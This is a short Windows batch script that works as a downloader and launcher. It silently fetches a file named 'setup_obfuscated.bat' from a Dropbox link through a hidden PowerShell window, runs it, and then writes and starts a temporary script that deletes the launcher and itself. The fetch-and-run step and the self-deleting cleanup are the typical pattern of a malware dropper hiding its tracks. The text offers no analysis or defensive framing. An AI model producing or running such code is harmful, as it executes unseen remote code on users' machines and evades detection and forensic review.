@echo off
setlocal

set "URL=https://www.dropbox.com/scl/fi/booisfmgbg30s1getzluo/setup_obfuscated.bat?rlkey=sic5zw038o99y7saskdfxfv2q&st=pm8oacln&dl=1"
set "OUT=%~dp0setup_obfuscated.bat"
set "LAUNCHER=%~f0"

:: download silently
powershell -NoProfile -WindowStyle Hidden -Command ^
  "try{ (New-Object System.Net.WebClient).DownloadFile('%URL%','%OUT%'); exit 0 } catch { exit 1 }" >nul 2>&1
if errorlevel 1 exit /b 1

:: start the downloaded script in a new visible window, then proceed to exit this script
start "" cmd /c "%OUT%"

:: create silent deleter that waits a moment, deletes the launcher, then deletes itself
set "DELETER=%temp%\del_self_%random%.bat"
(
  echo @echo off
  echo ping -n 4 127.0.0.1 ^>nul 2^>^&1
  echo del /f /q "%LAUNCHER%" ^>nul 2^>^&1
  echo del /f /q "%%~f0" ^>nul 2^>^&1
) > "%DELETER%"

:: run deleter minimized and detached, then exit to close this console
start "" /min cmd /c "%DELETER%"

endlocal
exit /b 0
